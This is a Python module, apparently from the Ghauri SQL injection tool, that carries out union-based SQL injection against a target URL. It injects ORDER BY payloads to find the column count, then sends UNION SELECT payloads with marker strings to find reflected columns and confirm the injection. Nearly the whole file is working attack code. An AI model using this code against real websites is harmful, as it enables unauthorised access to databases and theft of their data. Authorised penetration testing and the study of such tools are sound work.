#!/usr/bin/python3
# -*- coding: utf-8 -*-
# pylint: disable=R,W,E,C

"""
Union-based SQL Injection Detection Module

This module provides comprehensive union-based SQL injection detection
with dynamic column count detection using ORDER BY technique.
"""

import re
import time
from ghauri.common.lib import collections
from ghauri.logger.colored_logger import logger
from ghauri.core.inject import inject_expression
from ghauri.common.utils import get_filtered_page_content
from ghauri.common.colors import nc, mc


class UnionDetection:
    """Union-based SQL injection detection class"""
    
    def __init__(self):
        self.max_columns = 50  # Maximum columns to test
        self.error_patterns = {
            'mysql': [
                r"(?i)Unknown column '.*?' in 'order clause'",
                r"(?i)Unknown column '.*?' in 'field list'",
                r"(?i)The used SELECT statements have a different number of columns",
                r"(?i)mysql_fetch",
                r"(?i)mysql_num_rows"
            ],
            'postgresql': [
                r"(?i)column .* does not exist",
                r"(?i)ORDER BY position .* is not in select list",
                r"(?i)each UNION query must have the same number of columns",
                r"(?i)PostgreSQL.*ERROR"
            ],
            'mssql': [
                r"(?i)Invalid column name",
                r"(?i)ORDER BY items must appear in the select list",
                r"(?i)All queries combined using a UNION.*must have an equal number of expressions",
                r"(?i)Microsoft.*ODBC.*SQL Server"
            ],
            'oracle': [
                r"(?i)ORA-00904.*invalid identifier",
                r"(?i)ORA-01789.*query block has incorrect number of result columns",
                r"(?i)ORA-\d+"
            ]
        }
    
    def detect_column_count_order_by(self, base, parameter, url="", data="", headers="",
                                   injection_type="", proxy="", timeout=30, delay=0,
                                   prefix=None, suffix=None, is_json=False, is_multipart=False):
        """
        Detect column count using ORDER BY technique
        
        Args:
            base: Base response object
            parameter: Parameter object to test
            url: Target URL
            data: POST data
            headers: HTTP headers
            injection_type: Type of injection (GET, POST, etc.)
            proxy: Proxy settings
            timeout: Request timeout
            delay: Delay between requests
            prefix: Injection prefix
            suffix: Injection suffix
            is_json: JSON parameter flag
            is_multipart: Multipart form flag
            
        Returns:
            int: Number of columns detected, or None if detection failed
        """
        logger.info("Starting dynamic column count detection using ORDER BY technique")
        
        # Binary search for optimal performance
        low = 1
        high = self.max_columns
        last_working_column = 0
        
        while low <= high:
            mid = (low + high) // 2
            
            if delay > 0:
                time.sleep(delay)
            
            # Create ORDER BY payload
            order_by_payload = f"ORDER BY {mid}"
            if prefix:
                order_by_payload = f"{prefix} {order_by_payload}"
            if suffix:
                order_by_payload = f"{order_by_payload} {suffix}"
            
            logger.payload(f"Testing ORDER BY {mid}")
            
            # Inject the ORDER BY payload
            attack = inject_expression(
                url=url,
                data=data,
                proxy=proxy,
                delay=delay,
                timeout=timeout,
                headers=headers,
                parameter=parameter,
                expression=order_by_payload,
                is_multipart=is_multipart,
                injection_type=injection_type,
            )
            
            if not attack.ok:
                logger.debug(f"HTTP connection problem occurred during ORDER BY {mid} test")
                continue
            
            # Check if this column count caused an error
            content = get_filtered_page_content(attack.text, True)
            base_content = get_filtered_page_content(base.text, True)
            
            # Check for error patterns
            has_error = self._check_error_patterns(content)
            
            # Check for significant content differences
            content_diff = abs(len(content) - len(base_content))
            has_content_change = content_diff > 50
            
            if has_error:
                # Error found, column count is too high
                high = mid - 1
                logger.debug(f"ORDER BY {mid} caused error - column count too high")
            elif has_content_change:
                # Content changed but no error - this might be valid
                last_working_column = mid
                low = mid + 1
                logger.debug(f"ORDER BY {mid} caused content change - potentially valid")
            else:
                # No error and no significant change - column exists
                last_working_column = mid
                low = mid + 1
                logger.debug(f"ORDER BY {mid} executed successfully")
        
        if last_working_column > 0:
            logger.success(f"Detected {last_working_column} columns using ORDER BY technique")
            return last_working_column
        
        # Fallback to linear search if binary search fails
        logger.info("Binary search failed, falling back to linear search")
        return self._linear_column_detection(base, parameter, url, data, headers,
                                           injection_type, proxy, timeout, delay,
                                           prefix, suffix, is_json, is_multipart)
    
    def _linear_column_detection(self, base, parameter, url, data, headers,
                               injection_type, proxy, timeout, delay,
                               prefix, suffix, is_json, is_multipart):
        """
        Linear column count detection as fallback
        """
        for column_count in range(1, self.max_columns + 1):
            if delay > 0:
                time.sleep(delay)
            
            order_by_payload = f"ORDER BY {column_count}"
            if prefix:
                order_by_payload = f"{prefix} {order_by_payload}"
            if suffix:
                order_by_payload = f"{order_by_payload} {suffix}"
            
            logger.payload(f"Testing ORDER BY {column_count}")
            
            attack = inject_expression(
                url=url,
                data=data,
                proxy=proxy,
                delay=delay,
                timeout=timeout,
                headers=headers,
                parameter=parameter,
                expression=order_by_payload,
                is_multipart=is_multipart,
                injection_type=injection_type,
            )
            
            if not attack.ok:
                continue
            
            content = get_filtered_page_content(attack.text, True)
            
            # Check for error patterns
            if self._check_error_patterns(content):
                # Error found, previous column count was the maximum
                detected_columns = column_count - 1
                if detected_columns > 0:
                    logger.success(f"Detected {detected_columns} columns using linear ORDER BY")
                    return detected_columns
                break
        
        logger.warning("Could not detect column count using ORDER BY technique")
        return None
    
    def _check_error_patterns(self, content):
        """
        Check if content contains database error patterns
        
        Args:
            content: Response content to check
            
        Returns:
            bool: True if error patterns found
        """
        for dbms, patterns in self.error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, content):
                    logger.debug(f"Detected {dbms.upper()} error pattern: {pattern}")
                    return True
        return False
    
    def detect_injectable_columns(self, base, parameter, column_count, url="", data="",
                                headers="", injection_type="", proxy="", timeout=30,
                                delay=0, prefix=None, suffix=None, is_json=False,
                                is_multipart=False, dbms=None):
        """
        Detect which columns are injectable and visible in output
        
        Args:
            base: Base response object
            parameter: Parameter object
            column_count: Number of columns detected
            dbms: Database management system type
            
        Returns:
            list: List of injectable column positions
        """
        if not column_count:
            return []
        
        logger.info(f"Detecting injectable columns for {column_count} columns")
        
        injectable_columns = []
        test_marker = "ghauri_test_marker"
        
        for pos in range(1, column_count + 1):
            if delay > 0:
                time.sleep(delay)
            
            # Create UNION payload with test marker in specific position
            union_payload = self._generate_union_payload(column_count, pos, test_marker, dbms)
            
            if prefix:
                union_payload = f"{prefix} {union_payload}"
            if suffix:
                union_payload = f"{union_payload} {suffix}"
            
            logger.payload(f"Testing column {pos} with marker")
            
            attack = inject_expression(
                url=url,
                data=data,
                proxy=proxy,
                delay=delay,
                timeout=timeout,
                headers=headers,
                parameter=parameter,
                expression=union_payload,
                is_multipart=is_multipart,
                injection_type=injection_type,
            )
            
            if not attack.ok:
                continue
            
            content = get_filtered_page_content(attack.text, True)
            
            # Check if test marker appears in response
            if test_marker in content:
                injectable_columns.append(pos)
                logger.success(f"Column {pos} is injectable and visible")
        
        if injectable_columns:
            logger.success(f"Found {len(injectable_columns)} injectable columns: {injectable_columns}")
        else:
            logger.warning("No injectable columns found in output")
        
        return injectable_columns
    
    def _generate_union_payload(self, column_count, marker_position, marker_value, dbms=None):
        """
        Generate UNION SELECT payload with marker in specific position
        
        Args:
            column_count: Total number of columns
            marker_position: Position to place the marker (1-based)
            marker_value: Value to use as marker
            dbms: Database type for specific syntax
            
        Returns:
            str: UNION SELECT payload
        """
        columns = []
        
        for i in range(1, column_count + 1):
            if i == marker_position:
                if dbms and dbms.lower() == 'oracle':
                    columns.append(f"'{marker_value}'")
                else:
                    columns.append(f"'{marker_value}'")
            else:
                if dbms and dbms.lower() == 'oracle':
                    columns.append("NULL")
                else:
                    columns.append("NULL")
        
        union_select = ",".join(columns)
        
        if dbms and dbms.lower() == 'oracle':
            return f"UNION SELECT {union_select} FROM DUAL--"
        else:
            return f"UNION SELECT {union_select}--"
    
    def verify_union_injection(self, base, parameter, column_count, injectable_columns,
                             url="", data="", headers="", injection_type="", proxy="",
                             timeout=30, delay=0, prefix=None, suffix=None,
                             is_json=False, is_multipart=False, dbms=None):
        """
        Verify union injection with multiple test cases
        
        Returns:
            dict: Verification results with confidence score
        """
        if not injectable_columns:
            return {'verified': False, 'confidence': 0, 'details': 'No injectable columns'}
        
        logger.info("Verifying union injection with multiple test cases")
        
        verification_tests = [
            {'marker': 'test123', 'expected': 'test123'},
            {'marker': '999888777', 'expected': '999888777'},
            {'marker': 'UNION_TEST', 'expected': 'UNION_TEST'}
        ]
        
        successful_tests = 0
        total_tests = len(verification_tests)
        
        for test in verification_tests:
            if delay > 0:
                time.sleep(delay)
            
            # Use first injectable column for testing
            test_column = injectable_columns[0]
            union_payload = self._generate_union_payload(column_count, test_column, test['marker'], dbms)
            
            if prefix:
                union_payload = f"{prefix} {union_payload}"
            if suffix:
                union_payload = f"{union_payload} {suffix}"
            
            attack = inject_expression(
                url=url,
                data=data,
                proxy=proxy,
                delay=delay,
                timeout=timeout,
                headers=headers,
                parameter=parameter,
                expression=union_payload,
                is_multipart=is_multipart,
                injection_type=injection_type,
            )
            
            if attack.ok:
                content = get_filtered_page_content(attack.text, True)
                if test['expected'] in content:
                    successful_tests += 1
                    logger.debug(f"Verification test passed: {test['marker']}")
        
        confidence = (successful_tests / total_tests) * 100
        verified = confidence >= 66.7  # At least 2 out of 3 tests should pass
        
        result = {
            'verified': verified,
            'confidence': confidence,
            'successful_tests': successful_tests,
            'total_tests': total_tests,
            'column_count': column_count,
            'injectable_columns': injectable_columns
        }
        
        if verified:
            logger.success(f"Union injection verified with {confidence:.1f}% confidence")
        else:
            logger.warning(f"Union injection verification failed ({confidence:.1f}% confidence)")
        
        return result